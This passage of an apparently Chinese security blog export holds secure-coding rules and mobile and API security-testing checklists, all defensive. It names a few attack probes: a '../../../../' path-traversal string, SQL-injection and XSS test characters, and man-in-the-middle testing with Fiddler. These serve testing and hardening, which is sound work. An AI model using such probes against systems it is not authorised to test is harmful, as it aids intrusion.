HTTPS，则会生成一个新的会话标识符。在应用程序中，推荐持续使用 HTTPS，不应在 HTTP 和 HTTPS 之间来回转换，有效避免切换过程会话被劫持篡改。 为服务器端的操作执行标准的安全会话管理，为每个会话执行合法的身份验证和权限控制，防止存在CSRF跨站点请求伪造漏洞 九、访问控制 将具有特权的逻辑从其他应用程序代码中隔离开 限制只有授权的用户才能访问文件资源 限制只有授权的用户才能访问受保护的URL 限制只有授权的用户才能访问受保护的功能或服务 建议只有授权的用户才能访问直接对象引用 限制只有授权的用户才能访问受保护的应用程序数据 限制只有授权的用户才能访问与安全相关的配置信息 限制只有授权的外部应用程序或接口才能访问受保护的本地程序或资源 服务器端执行的访问控制规则和前端实施的访问控制规则必须匹配 服务器中创建文件时需指定合理的访问权限（读/写/可执行） 当权限重新设置发生变更时，应记录好日志，并短信通知用户是否是本人在操作，告知可能存在的安全风险 十、日志规范 不要在日志中保存敏感信息，包括系统指纹信息、会话标识符、账号密码、证件、ID等 确保日志记录包含了重要的日志事件数据 记录所有失败和成功的输入验证 记录所有失败和成功的身份验证记录 记录所有失败和成功的访问和操作记录 记录明显的修改事件，包括对于状态数据的修改 记录连接无效或者已过期的会话令牌尝试 记录所有的管理功能操作行为，包含但不限于安全配置设置的变更 记录所有失败和成功的后端连接 记录加密模块的错误信息 禁止将日志直接保存在可被浏览器访问到的WEB目录中 十一、敏感信息 临时产生的敏感数据（写入内存或文件），应具有及时清除和释放机制 不要在 HTTP GET 请求参数中包含敏感信息，如用户名、密码、卡号、ID等 禁止表单中的自动填充功能，因为表单中可能包含敏感信息，包括身份验证信息 不要在客户端上以明文形式保存密码或其他敏感信息 为所有敏感信息采用SSL加密传输 禁止将敏感信息（包含加密秘钥等）硬编码在程序中 禁止明文存储用户的密码、身份证号、银行卡号、持卡人姓名等敏感信息 不要在日志中保存敏感信息，包含但不限于系统详细信息、会话标识符、密码等 禁止在异常中泄露应用服务器的指纹信息，如版本，路径，组件版本等 禁止将源码或sql上传到开源平台或社区，如github、开源中国等 请求中含有敏感参数（如订单号、ID等），应进行混淆方式处理，防止产生参数遍历获取信息风险 敏感信息需要展示在web页面上时，应在后台进行敏感字段脱敏处理 请求返回数据不应包含请求之外的业务数据，特别是敏感信息数据 十二、密码找回安全 服务器端要做认证，避免绕过前端控制 增加二次认证因子，如验证码 涉及登录验证token之类的，不要直接将验证内容直接返回给用户 认证凭证加密，推荐强算法（推荐使用AES: 128位，RSA: 2048位，DSA: 2048位） 认证凭证中的参数应进行混淆处理 在多个验证操作中，要对各验证机制进行排序，以防出现跳过前面验证机制直接到最后一步认证的安全风险 手机短信码验证，需同时校验手机号和短信是否对应 输入框中，应校验输入数据合法性，防止产生XSS跨站脚本攻击 密码找回链接限制有效访问时间和复用次数（不可重复使用） 十三、SQL注入 永远不要信任用户的输入，要对用户的所有输入进行校验，包含SQL语句的过滤和转义 永远不要使用动态拼装SQL，可以使用参数化的SQL或者使用存储过程进行数据查询存取 永远不要使用管理员权限进行数据库连接，为每个应用使用单独的非特权权限，且配置有限的数据库连接数 不要把敏感信息明文存放，采用加密或者哈希、混淆等方式对敏感信息进行脱敏存储 应用的异常信息应不带有敏感信息，给出尽可能少的提示；建议使用自定义的错误信息对原始错误信息进行包装，可把异常信息存放在独立的数据库表中 XML注入- 不要使用字符串/StringBuffer/StringBuilder/StringFormat组装XML 建议对XML元素属性或者内容进行转义 十四、XSS跨站脚本攻击 对输入的数据进行过滤和转义，包含但不限于&lt; &gt;” ‘ % ( ) &amp; + \ \’ \”等危险特殊字符 数据添加到html元素属性或者内容中时，对数据进行HTML转义 数据添加到script脚本中时，对数据进行script转义 数据添加到style中时，对数据进行css转义 十五、CSRF跨站请求伪造 建议在每个关键表单中引入了CSRF Token验证(会话中生成的随机串，提交后校验) 在关键表单提交时要求用户进行二次身份验证（录入密码、插KEY、输入图片验证码、短信验证码） 对请求referer做验证（比如跨域、系统内部应用） 十六、文件上传安全 上传操作应设计身份验证机制，并进行合法身份校验 只允许上传满足业务需要的相关文档类型 通过检查文件头信息，比如JPEG (jpg)文件头信息（十六进制）：FFD8FF，验证上传文档是否是所期待的类型 不要把文件保存在与应用程序相同的 Web 环境中，建议将文件保存在专用的文档服务器中，单独给文档服务器配置域名访问更好 限制上传任意可能被 Web 服务器解析的文件 ，比如jsp、php等 上传文件以二进制形式下载，建议不提供直接访问（防止木马文件直接执行） 禁止授予上传文件存储目录的可执行权限 禁止客户端自定义文件上传/下载路径（如：使用../../../../进行跳转） 文件上传后重命名（需根据业务实际需求制定命名规则） 十七、组件安全 在使用随机数函数时，推荐使用强随机数函数（例如java.security.SecureRandom类） 精简组件中不需要的功能、方法，以免带来未知的安全风险 不可将系统内部使用的锁对象暴露给不可信代码 建议使用SSL Socket代替Socket来进行安全数据交互 封装本地方法调用（所有的本地方法都应该被定义为私有的，然后仅通过一个封装方法来调用） 使用安全管理器（比如java.security或第三方安全组件）来保护敏感操作 编写自定义类加载器必须覆盖getPermissions()函数时，在为代码源分配任意权限前，应调用超类super.getPermissions（）函数，实现除了自定义策略外，系统全局的默认安全策略也被应用。 避免完全依赖URLClassLoader和java.util.jar提供的默认自动签名认证机制，应从加载类的代码源（Code-Source）中获取证书链，然后检查证书是否属于本地密钥库（KeyStore）中的受信任签名者 十八、接口安全 调用方来源IP控制，比如可通过防火墙、主机host deny、Nginx deny等技术措施进行实施 调用方身份认证，比如key、secret、证书等技术措施进行实施 调用参数认证，需设计参数容错机制，避免出现参数可遍历敏感数据安全问题 采用数字签名保障接口身份来源可信，数据防篡改 调用方权限控制设置 调用频率、有效期进行控制 调用行为实时检测，对异常阻拦 幂等性校验，保持数据一致性 采用应用接入安全网关，实现APPID/KEY身份认证，加密传输，摘要签名安全保障 十九、Dubbo调用安全 采用token验证访问控制，防止消费者绕过注册中心访问提供者；在注册中心控制权限以决定要不要下发令牌给消费者 采用filter IP白名单访问控制，同时也可预防生产系统和测试系统之间Dubbo混乱调用问题 在必要情况下（如敏感信息操作），连接注册中心Dubbo时要进行用户名和密码校验 二十、Redis调用安全 应启用客户端IP访问控制验证功能 应启用客户端身份验证功能 敏感信息不要明文存储于Redis 本文引自SDL China —— 中国互联网一线安全工程师编写整理]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全文档</tag>
        <tag>SDL</tag>
        <tag>Checklist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ios安全Checklist]]></title>
    <url>%2FSecurity%2Fios%E5%AE%89%E5%85%A8Checklist%2F</url>
    <content type="text"><![CDATA[项目 评级 内部评级 扫描器可否检测 检测方法 危害 备注 不安全的存储 中 具体分析 调研 静态分析应用程序逻辑，以及在设备上安装程序检查其数据和权限，判断应用是否合理使用沙盒和 KeyChain 保护私有数据和身份凭据。 攻击者可通过企业证书诱骗安装恶意应用，对未妥善使用沙箱保护的数据进行获取，实现进一步控制用户账户等目的。 不安全的服务端 SSL 部署 高 具体分析 yes 分析通信 API 服务端，检查是否启用加密连接、是否使用过时的加密套件、是否存在已知的加密套件漏洞、密钥强度是否达到要求。 不安全的服务端 SSL 部署将导致加密强度达不到要求，或受到已知攻击方式的威胁，从而让攻击者破解密钥，实现中间人攻击。 不正确的证书校验 高 中 调研 静态分析程序是否正确地使用了 SSL 证书校验，是否验证了证书的域名、发行者、有效期。 客户端不正确的证书校验可导致被中间人攻击。 未使用 SSL Pinning 高 低 调研 静态分析程序是否采用了 SSL Pinning。 攻击者可以在网页中提供根证书下载，诱导受害者安装信任，从而让 App 即使使用了正确的证书校验 Api 流程后依然可以被攻击者完全解密流量，实现中间人攻击。 iOS 上的证书安装比 Android 简单很多 不安全的 ATS 配置 高 低 yes 静态分析程序是否允许任意内容使用非 SSL 载入。 开启 NSAllowsArbitraryLoads 允许任意内容通过明文传送，可能导致中间人攻击；此外 AppStore 将加强对此选项的限制，可能导致上架困难。 密码学实现问题 中 具体分析 调研 静态分析应用程序逻辑和动态跟踪结合，逆向密码学相关函数调用，检查是否存在错误的密码学实现，如硬编码的对称加密密钥或强度不足的单向散列函数。 错误的密码学功能实现将导致加密强度显著降低，结合其他问题进一步攻击应用程序。 不安全的用户认证 高 具体分析 no 静态分析应用程序逻辑和动态跟踪结合，逆向用户认证过程，检查是否存在逻辑和实现漏洞。 不安全的用户认证可能导致用户身份被冒用、撞库攻击等，危害帐号安全。 客户端 SQL 注入 具体分析 具体分析 调研 按照可显注入、报错注入、盲注的方式检测，通过添加 ’, ”, +, and, or, xor 等闭合符号，逻辑字符判断 SQL 注入漏洞是否存在。 攻击者利用本地 SQL 注入漏洞，可能导致获取数据库中的敏感信息，实现进一步控制用户账户的等目的。 内网 IP 泄漏 低 低 yes 静态分析应用程序的代码中是否包含了硬编码的服务端私有地址。 攻击者可使用得到的地址，结合其他服务端应用对内网发起 SSRF 等类型的攻击。 客户端路径穿越 高 具体分析 调研 静态分析应用程序逻辑，以及动态跟踪程序执行。 攻击者可使用路径穿越问题访问应用的私有数据。 未启用地址随机化 高 低 yes 静态分析应用可执行文件，检查是否启用 PIE 保护。 未开启 PIE 的应用将降低内存破坏类漏洞的利用难度。 未启用栈 cookie 高 低 yes 静态分析应用可执行文件，检查标志位是否启用 Stack Canary 保护。 未开启 Stack Canary 的应用将更容易受到栈溢出漏洞的攻击。 未启用 ARC 高 低 yes 静态分析应用可执行文件，检查是否启用 Automatic Reference Counting 管理对象。 ARC 是 Objective C 中对象内存管理的机制，开启后可以减少手动管理内存而导致的对象引用问题。 URL Scheme 滥用 具体分析 具体分析 no 静态分析 URL Scheme 处理历程和动态模糊测试，判断程序在处理 URL Scheme 时是否存在可以被攻击的流程。 攻击者可以使用网页等方式唤起应用，执行特定的流程触发漏洞。 第三方代码问题 具体分析 具体分析 调研 检测第三方 SDK 和程序引用及其版本，检查是否存在已知安全漏洞、后门甚至恶意代码（如 XCodeGhost）。 程序通过 SDK 等方式引入的第三方代码，如包含后门、漏洞等，将直接影响到应用本身的安全，且难以自行修复。 基于 cocoapods 的第三方代码检测？ 敏感内容输出到日志 具体分析 低 调研 使用静态分析和动态运行相结合，检查应用是否将敏感信息输出到日志中。 攻击者可读取系统日志跨应用获取信息。 hook 很容易实现，问题是如何判断信息敏感？ 未启用键盘记录保护 中 低 调研 静态分析应用可执行文件，结合动态跟踪，根据应用安全性要求判断是否需要对特定输入控件添加自定义软键盘。 系统键盘可能导致第三方应用读取键盘缓存获取用户名，或使用屏幕录制截取用户输入。 基于 hook 实现？ 敏感应用未进行越狱检测 低 低 调研 静态分析应用逻辑结合越狱设备实机安装，判断应用是否根据自身需求对越狱环境进行检测，以及告知用户潜在的风险。 在越狱设备上将极大增加 App 的攻击面，恶意软件可以使用非公开 API、Hook 等技术绕过应用沙盒，获取用户 token、登录凭据等敏感信息。 静态查询是否包含符号、特殊字符串 访问控制不当 低 具体分析 yes 静态分析应用可执行文件，结合动态跟踪，分析应用访问控制模型是否符合安全性要求。 错误的访问控制策略可能导致用户敏感信息遭到泄露。 逻辑缺陷 具体分析 具体分析 no 静态分析应用可执行文件，结合动态跟踪，分析应用是否存在可以被攻击利用的逻辑错误。 逻辑错误将导致应用出现非设计预期的行为。 未对系统截图做保护 低 低 no 检查应用进入后台是否会保存屏幕截图。 当程序进入后台的截屏包含敏感信息可能导致隐私泄露。 敏感数据明文传输 高 中 no 检查应用与服务器通信数据包中敏感信息是否加密。 当用户遭受中间人攻击时，如果敏感信息明文传输将导致信息泄露。 敏感数据允许使用剪贴板 中 低 no 检查应用敏感数据是否可复制。 iOS系统剪贴板可以被任意应用访问，如果允许用户复制敏感数据则存在信息泄露风险。 错误页面泄露敏感信息 具体分析 低 no 检查应用异常状态下，错误信息是否包含敏感数据。 错误页面中不必要的输出可能导致信息泄露，或者为攻击者提供额外信息。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全文档</tag>
        <tag>SDL</tag>
        <tag>Checklist</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android安全Checklist]]></title>
    <url>%2FSecurity%2FAndroid%E5%AE%89%E5%85%A8Checklist%2F</url>
    <content type="text"><![CDATA[项目 评级 内部评级 扫描器可否检测 检测方法 危害 备注 应用可以被调试 高 低 yes 检查样式清单，是否允许被调试。检查应用是否使用反调试技巧防止被附加调试。 可以被调试的应用将降低对应用逆向工程的成本。 应用可以被备份 高 低 yes 检查样式清单，是否允许被备份。 在开启 USB 调试的设备上可备份应用和数据，在设备没有 root 的情况下访问私有数据目录。 ContentProvider权限问题 具体分析 具体分析 yes 检查样式清单，是否为 ContentProvider 设置了足够的权限限制。 攻击者可以不受限制地访问敏感的 ContentProvider，获取私有数据或权限提升。 冗余的权限 低 低 yes 检查样式清单，是否注册了冗余的权限。 冗余的权限将导致在发生代码执行漏洞时，攻击者可以获得更多的应用权限。 Android 在新版废弃了一些权限，即使加上也不能使用相关功能。 https://developer.android.com/reference/android/Manifest.permission.html#READ_LOGS 代码可被重打包 高 低 yes 解包应用，篡改内容并重新签名，判断程序是否对反编译工具添加了处理，以及对自身完整性进行校验。 重打包可能导致仿冒应用出现在市场中，威胁用户安全。 客户端 SQL 注入 高 具体分析 调研 按照可显注入、报错注入、盲注的方式检测，通过添加 ’, ”, +, and, or, xor 等闭合符号，逻辑字符判断 SQL 注入漏洞是否存在。 攻击者利用本地 SQL 注入漏洞，可能导致获取数据库中的敏感信息，实现进一步控制用户账户的等目的。 需要找到可执行路径 不安全的存储 具体分析 具体分析 yes 静态分析应用程序逻辑，以及在设备上安装程序检查其数据和权限，判断应用是否合理使用沙盒保护私有数据和身份凭据，是否有将敏感信息输出到扩展存储（TF 卡等）的行为。 错误的数据存储可能导致攻击者可以跨应用获取敏感数据。 明文存储密码 中 具体分析 调研 静态分析应用程序逻辑，以及在设备上安装程序检查其数据目录。 明文存储密码可导致应用更易受到取证工具攻击。 不安全的服务端 SSL 部署 高 具体分析 yes 分析通信 API 服务端，检查是否启用加密连接、是否使用过时的加密套件、是否存在已知的加密套件漏洞、密钥强度是否达到要求。 不安全的服务端 SSL 部署将导致加密强度达不到要求，或受到已知攻击方式的威胁，从而让攻击者破解密钥，实现中间人攻击。 敏感数据明文传输 高 中 调研 分析应用与后台服务器通信数据中敏感数据是否为明文传输。 当用户遭受中间人攻击时可能导致信息泄露。 不正确的证书校验 高 中 yes 静态分析程序是否正确地使用了 SSL 证书校验，是否验证了证书的域名、发行者、有效期。 客户端不正确的证书校验可导致被中间人攻击。 未使用 SSL Pinning 中 低 调研 静态分析程序是否采用了 SSL Pinning。 攻击者可以在网页中提供根证书下载，诱导受害者安装信任，从而让 App 即使使用了正确的证书校验 Api 流程后依然可以被攻击者完全解密流量，实现中间人攻击。 Android 下面安装证书很麻烦 WebView 安全 高 具体分析 yes 静态分析应用程序逻辑和动态跟踪结合，检查是否存在 WebView 对象注入漏洞和错误地使用 WebView 相关功能，如未禁止记住密码、允许 Javascript 访问本地域、忽略证书错误等。 WebView 的风险问题可能导致用户在浏览页面时被恶意安装应用、窃取隐私文件。 应用卸载无法删除缓存数据 中 低 调研 检查应用保存缓存数据位置及卸载逻辑。 如果缓存数据包含敏感信息，可能存在信息泄露风险。 敏感信息允许使用剪贴板 中 低 no 检查应用敏感信息是否可被用户复制。 Android 系统剪贴板可以被任意应用访问，如果允许用户复制敏感数据则存在信息泄露风险。 本地认证绕过 高 具体分析 no 静态分析本地认证措施（如手势密码等）是否可以被绕过。 逻辑问题可能导致本地认证绕过，在物理接触设备的情况下获取用户隐私或身份凭据。 本地 socket 端口 具体分析 具体分析 yes 检查是否可以伪造数据与本地 socket 端口进行通信，以及响应逻辑是否存在可利用的漏洞。 通过伪造数据可以任意触发 socket 服务端逻辑。 Activity 劫持 高 具体分析 yes 静态分析应用结合动态跟踪，检查是否可以劫持界面进行钓鱼攻击。 Activity 劫持可实现劫持界面，诱骗用户输入密码等关键信息 命令注入 高 具体分析 yes 检查应用是否存在命令注入 命令注入可导致任意命令执行 使用隐式 Intent 动态授予 URI 权限 具体分析 具体分析 yes 检查使用动态授予 URI 权限的 Intent 是否为显式。 当授予 ContentProvider 读或写权限的 Intent 被劫持，将存在信息泄露或被篡改风险 广播或意图伪造 具体分析 具体分析 调研 静态分析应用结合动态跟踪，检查是否可以通过伪造广播消息触发应用的特定流程。 广播伪造可让应用执行特定流程，进一步实现伪造用户请求、拒绝服务、本地权限提升等。 广播或意图劫持 具体分析 具体分析 yes 静态分析应用结合动态跟踪，检查是否存在将敏感信息发送至广播中。 广播劫持可截取应用程序的广播消息，获取参数中的敏感信息。 Zip 路径穿越 高 具体分析 调研 静态分析应用，检查是否正确处理 Zip 解压。 利用精心构造的 Zip 文件，可以跨路径覆盖应用的私有数据， 进而实现任意代码执行等。 需要能找到执行路径 客户端XSS 高 具体分析 调研 静态分析和模糊测试，检查客户端渲染 HTML 界面时是否能插入恶意代码。 利用精心构造的输入，在客户端 HTML 界面中植入特定逻辑，进一步实现获取用户凭据等。 密码学实现问题 具体分析 具体分析 部分 静态分析应用程序逻辑和动态跟踪结合，逆向密码学相关函数调用，检查是否存在错误的密码学实现，如硬编码的对称加密密钥或强度不足的单向散利函数。 错误的密码学功能实现将导致加密强度显著降低，结合其他问题进一步攻击应用程序。 不安全的用户认证 高 具体分析 no 静态分析应用程序逻辑和动态跟踪结合，逆向用户认证过程，检查是否存在逻辑和实现漏洞。 不安全的用户认证可能导致用户身份被冒用、撞库攻击等，危害帐号安全。 内网 IP 泄漏 中 低 yes 静态分析应用程序的代码中是否包含了硬编码的服务端私有地址。 攻击者可使用得到的地址，结合其他服务端应用对内网发起 SSRF 等类型的攻击。 错误页面泄露隐私信息 具体分析 低 no 检查应用异常状态下错误信息是否包含敏感信息。 客户端或服务端的异常信息中如果包含敏感数据则易导致信息泄露或者为攻击者提供额外信息 客户端路径穿越 高 具体分析 调研 静态分析应用程序逻辑，以及动态跟踪程序执行。 攻击者可使用路径穿越问题访问应用的私有数据。 需要找到可执行路径 第三方代码问题 具体分析 具体分析 调研 检测第三方 SDK 和程序引用及其版本，检查是否存在已知安全漏洞、后门甚至恶意代码。 程序通过 SDK 等方式引入的第三方代码，如包含后门、漏洞等，将直接影响到应用本身的安全，且难以自行修复。 敏感内容输出到日志 具体分析 低 调研 使用静态分析和动态运行相结合，检查应用是否将敏感信息输出到日志中。 攻击者可读取系统日志跨应用获取信息。 未启用键盘记录保护 中 低 调研 静态分析应用可执行文件，结合动态跟踪，根据应用安全性要求判断是否需要对特定输入控件添加自定义软键盘。 系统键盘可能导致第三方应用读取键盘缓存获取用户名，或使用屏幕录制截取用户输入。 敏感应用未进行root检测 低 低 yes 静态分析应用逻辑结合设备实机安装，判断应用是否根据自身需求对环境进行检测，以及告知用户 root 后的潜在的风险。 在已 root 设备上将极大增加 App 的攻击面，恶意软件可以使用非公开 API、Hook 等技术绕过应用沙盒，获取用户 token、登录凭据等敏感信息。 访问控制不当 高 低 no 静态分析应用可执行文件，结合动态跟踪，分析应用访问控制模型是否符合安全性要求。 错误的访问控制策略可能导致用户敏感信息遭到泄露。 逻辑缺陷 具体分析 具体分析 no 静态分析应用可执行文件，结合动态跟踪，分析应用是否存在可以被攻击利用的逻辑错误。 逻辑错误将导致应用出现非设计预期的行为。 native代码可被调试 中 具体分析 no 动态分析应用native部分程序是否使用反调试技巧防止代码被动态调试。 native代码可以被调试将降低对应用逆向工程的成本。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全文档</tag>
        <tag>SDL</tag>
        <tag>Checklist</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[APP安全测试]]></title>
    <url>%2FSecurity%2FAPP%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[一、安装包测试1.1 关于反编译 目的是为了保护公司的知识产权和安全方面的考虑等，一些程序开发人员会在源码中硬编码一些敏感信息，如密码。而且若程序内部一些设计欠佳的逻辑，也可能隐含漏洞，一旦源码泄漏，安全隐患巨大。 为了避免这些问题，除了代码审核外，通常开发的做法是对代码进行混淆，混淆后源代码通过反软件生成的源代码是很难读懂的，测试中，我们可以直接使用反编译工具（dex2jar和jd-gui工具）查看源代码，判断是否进行了代码混淆，包括显而易见的敏感信息。 1.2 关于签名 这点IOS可以不用考虑，因为APP stroe都会校验。但Android没有此类权威检查，我们要在发布前校验一下签名使用的key是否正确，以防被恶意第三方应用覆盖安装等。可使用下列命令检查：jarsigner -verify -verbose -certs apk包路径 若结果为“jar 已验证”，说明签名校验成功。 1.3 完整性校验 为确保安装包不会在测试完成到最终交付过程中因为知足者趾问题发生文件损坏，需要对安装包进行完整性校验，通常做法是检查文件的md5值，而且一般可以通过自动化做校验。 1.4 权限设置检查 一般用户对自己的隐私问题十 分敏感，因此，我们需要对APP申请某些特定权限的必要性进行检查，如访问通讯录等。对于没有必要的权限，一般都建议开发 直接支除。 Android：直接检查manifest文件来读取应用所需要的全部权限，并结合需求进行校验此权限是否为必须的。manifest文件的修改也需要关注，在增加新权限前需要进行评估。 IOS：没有类似manifest文件来查看，IOS的用户权限只有在用户使用APP到了需要使用的权限时，系统才会弹出提示框，提示用户当前APP需要访问照片、联系人列表等组件。我们可以扫描代码来查看项目工程中有哪些权限设置。通过搜索关键类名，如通讯录一般需要访问ABAddressBookRef，照片是UIImagePickerController等。如果是纯黑盒测试，则必须覆盖到所有代码路径才能保证没有遗漏，也可使用代码覆盖率测试判断是否覆盖。 二、敏感信息测试 数据库是否存储敏感信息，某些应用会把cookie类数据保存在数据库中，一旦此数据被他人获取，可能造成用户账户被盗用等严重问题，测试中在跑完一个包含数据库操作的测试用例后，我们可以直接查看数据库里的数据，观察是否有敏感信息存储在内。一般来说这些敏感信息需要用户进行注销操作后删除。如果是cookie类数据，建议设置合理的过期时间。 日志是否存在敏感信息，一般开发在写程序的过程中会加入日志帮助高度，所有可能会写入一些敏感信息，通常APP的发布版不会使用日志，但也不排除特殊情况。 配置文件是否存在敏感信息，与日志类似，我们需要检查配置文件中是否包含敏感信息。 三、软键盘劫持 如果用户安装了第三方键盘，可能存在劫持情况，对此，我们在一些特别敏感的输入地方可以做检查，例如金融类APP登录界面的用户名密码输入框等，看是否支持第三方输入法，一般建议使用应用内的软键盘。 四、账户安全 密码是否明文存储在后台数据库，在评审和测试中需要关注密码的存储。 密码传输是否加密，测试中我们需要查看密码是否被 明文传输，如果是HTTP接口，我们可以使用FIddler等工具直接查看。 账户锁定策略。对于 用户输入错误密码次数过多的情况，是否会将账户临时锁定，避免被暴力破解， 同时会话情况。一些应用对同时会话会有通知功能，这样至少可以让用户知识他的账户可能已经被泄漏了。在一定程度上能免提升用户体验。 注销机制。在客户端注销后，我们需要验证任何的来自该用户的，需要身份验证的接口调用都不能成功。 五、数据通信安全 关键数据是否散列或加密。密码在传输中必须是加密的，其他敏感信息传输前也需要进行散列或者加加密，以免被中间节点获取并恶意利用。 关键连接是否使用安全通信，例如HTTPS。在获知接口设计后我们需要评估是否其中内容包含敏感信息，如果未使用安全通信，需要知会开发修改。 是否对数字证书合法性进行验证。即便使用了安全通信，例如HTTPS，我们也需要在客户端代码中对服务端证书进行合法性校验。测试中可以使用Fiddler工具模拟中间人攻击方法。如果客户端对于Fiddler证书没有校验而能正常调用，则存在安全隐患。 是否校验数据合法性。在一些情况下，我们需要有方法来确保服务端下发的明文数据不被篡改。通常开发侧的实现方式是对数据进行数字签名并在客户端进行校验。我们可以模拟后台返回进行相关的测试工作。此外，对于其他一些客户端未进行数据校验的接口，我们也需要有意识地思考如果不进行校验是否会产生问题，并通过模拟后台返回验证。 六、组件安全测试 这里主要是指Android平台各个组件是否能被 外部应用恶意调用从而带来一些安全问题。包括Activity、Service、ContentProvider、Broadcast等等。采用的测试方法是通过使用drozer工具结合查看代码的方式，具体使用方法可查看官方文档。 七、服务端接口测试 主要关注服务端接口是否存在以下问题 SQL注入 XSS跨站脚本攻击 CSRF跨站请求伪造 越权访问 除了上述服务端问题外，我们还需要结合实际的需求，设计和代码，分析是否需求或设计本身就会带来安全问题。 八、附录 软件权限 扣费风险：包括短信、拨打电话、连接网络等。 隐私泄露风险：包括访问手机信息、访问联系人信息等。 对App的输入有效性校验、认证、授权、数据加密等方面进行检测 限制/允许使用手机功能接入互联网 限制/允许使用手机发送接收信息功能 限制或使用本地连接 限制/允许使用手机拍照或录音 限制/允许使用手机读取用户数据 限制/允许使用手机写入用户数据 限制/允许应用程序来注册自动启动应用程序 数据安全性 当将密码或其它的敏感数据输入到应用程序时，其不会被存储在设备中，同时密码也不会被解码。 输入的密码将不以明文形式进行显示。 密码、信用卡明细或其他的敏感数据将不被存储在它们预输入的位置上。 不同的应用程序的个人身份证或密码长度必须至少在4-8个数字长度之间。 当应用程序处理信用卡明细或其它的敏感数据时，不以明文形式将数据写到其他单独的文件或者临时文件中。以防止应用程序异常终止而又没有删除它的临时文件，文件可能遭受入侵者的袭击，然后读取这些数据信息。 党建敏感数据输入到应用程序时，其不会被存储在设备中。 应用程序应考虑或者虚拟机器产生的用户提示信息或安全警告 应用程序不能忽略系统或者虚拟机器产生的用户提示信息或安全警告，更不能在安全警告显示前，利用显示误导信息欺骗用户，应用程序不应该模拟进行安全警告误导用户。 在数据删除之前，应用程序应当通知用户或者应用程序提供一个“取消”命令的操作。 应用程序应当能够处理当不允许应用软件连接到个人信息管理的情况。 当进行读或写用户信息操作时，应用程序将会向用户发送一个操作错误的提示信息。 在没有用户明确许可的前提下不损坏删除个人信息管理应用程序中的任何内容。 如果数据库中重要的数据正要被重写，应及时告知用户。 能合理的处理出现的错误。 意外情况下应提示用户。 通讯安全性 在运行软件过程中，如果有来电、SMS、蓝牙等通讯或充电时，是否能暂停程序，优先处理通信，并在处理完毕后能正常恢复软件，继续其原来的功能。 当创立连接时，应用程序能够处理因为网络连接中断，进而告诉用户连接中断的情况。 应能处理通讯延时或中断。 应用程序将保持工作到通讯超时，进而给用户一个错误信息指示有链接错误。 应能处理网络异常和及时将异常情况通报用户。 应用程序关闭网络连接不再使用时应及时关闭，断开。 人机接口安全测试 返回菜单应总保持可用。 命令有优先权顺序。 声音的设置不影响使用程序的功能。 应用程序必须能够处理不可预知的用户操作，例如错误的操作和同时按下多个键。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全文档</tag>
        <tag>SDL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[API安全开发Checklist]]></title>
    <url>%2FSecurity%2FAPI%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91Checklist%2F</url>
    <content type="text"><![CDATA[一、身份认证 [ ] 不要使用 Basic Auth 使用标准的认证协议 (如 JWT, OAuth). [ ] 不要再造 Authentication, token generating, password storing 这些轮子, 使用标准的. [ ] 在登录中使用 Max Retry 和自动封禁功能. [ ] 加密所有的敏感数据. 1.1 JWT (JSON Web Token) [ ] 使用随机复杂的密钥 (JWT Secret) 以增加暴力破解的难度. [ ] 不要在请求体中直接提取数据, 要对数据进行加密 (HS256 或 RS256). [ ] 使 token 的过期时间尽量的短 (TTL, RTTL). [ ] 不要在 JWT 的请求体中存放敏感数据, 它是可破解的. 1.2 OAuth 授权或认证协议 [ ] 始终在后台验证 redirect_uri, 只允许白名单的 URL. [ ] 每次交换令牌的时候不要加 token (不允许 response_type=token). [ ] 使用 state 参数并填充随机的哈希数来防止跨站请求伪造(CSRF). [ ] 对不同的应用分别定义默认的作用域和各自有效的作用域参数. 二、访问 [ ] 限制流量来防止 DDoS 攻击和暴力攻击. [ ] 在服务端使用 HTTPS 协议来防止 MITM 攻击. [ ] 使用 HSTS 协议防止 SSLStrip 攻击. 三、输入 [ ] 使用与操作相符的 HTTP 操作函数, GET (读取), POST (创建), PUT (替换/更新) 以及 DELETE (删除记录), 如果请求的方法不适用于请求的资源则返回 405 Method Not Allowed. [ ] 在请求头中的 content-type 字段使用内容验证来只允许支持的格式 (如 application/xml, application/json 等等) 并在不满足条件的时候返回 406 Not Acceptable. [ ] 验证 content-type 的发布数据和你收到的一样 (如 application/x-www-form-urlencoded, multipart/form-data, application/json 等等). [ ] 验证用户输入来避免一些普通的易受攻击缺陷 (如 XSS, SQL-注入, 远程代码执行 等等). [ ] 不要在 URL 中使用任何敏感的数据 (credentials, Passwords, security tokens, or API keys), 而是使用标准的认证请求头. [ ] 使用一个 API Gateway 服务来启用缓存、访问速率限制 (如 Quota, Spike Arrest, Concurrent Rate Limit) 以及动态地部署 APIs resources. 四、处理 [ ] 检查是否所有的终端都在身份认证之后, 以避免被破坏了的认证体系. [ ] 避免使用特有的资源 id. 使用 /me/orders 替代 /user/654321/orders [ ] 使用 UUID 代替自增长的 id. [ ] 如果需要解析 XML 文件, 确保实体解析(entity parsing)是关闭的以避免 XXE 攻击. [ ] 如果需要解析 XML 文件, 确保实体扩展(entity expansion)是关闭的以避免通过指数实体扩展攻击实现的 Billion Laughs/XML bomb. [ ] 在文件上传中使用 CDN. [ ] 如果需要处理大量的数据, 使用 Workers 和 Queues 来快速响应, 从而避免 HTTP 阻塞. [ ] 不要忘了把 DEBUG 模式关掉. 五、输出 [ ] 发送 X-Content-Type-Options: nosniff 头. [ ] 发送 X-Frame-Options: SAMEORIGIN(或deny) 头. [ ] 发送 Content-Security-Policy: default-src &#39;none&#39; 头. [ ] 删除指纹头 - X-Powered-By, Server, X-AspNet-Version 等等. [ ] 在响应中强制使用 content-type, 如果你的类型是 application/json 那么你的 content-type 就是 application/json. [ ] 不要返回敏感的数据, 如 credentials, Passwords, security tokens. [ ] 在操作结束时返回恰当的状态码. (如 200 OK, 400 Bad Request, 401 Unauthorized, 405 Method Not Allowed 等等). 六、持续集成和持续部署 [ ] 